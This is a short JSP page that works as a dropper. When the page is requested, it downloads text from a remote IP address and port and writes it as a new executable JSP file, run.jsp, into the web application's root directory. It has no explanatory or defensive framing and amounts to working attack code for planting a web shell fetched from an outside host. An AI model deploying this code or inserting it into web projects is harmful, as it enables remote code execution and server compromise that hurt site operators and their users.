<%@ page import="java.net.*, java.io.*" %>
<%
    try {
        URL url = new URL("http://203.0.113.1:33333/text");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String line;
        StringBuilder content = new StringBuilder();
        while ((line = reader.readLine()) != null) {
            content.append(line);
        }
        reader.close();
        
        //out.print(content.toString());
	String webappPath = application.getRealPath("/");
        String jspContent = content.toString();

        FileWriter writer = new FileWriter(webappPath + "run.jsp");
        writer.write(jspContent);
        writer.close();

        out.print("JSP file 'run.jsp' created successfully.\n");
    } catch (Exception e) {
        out.print("Error: " + e.getMessage());
    }
%>
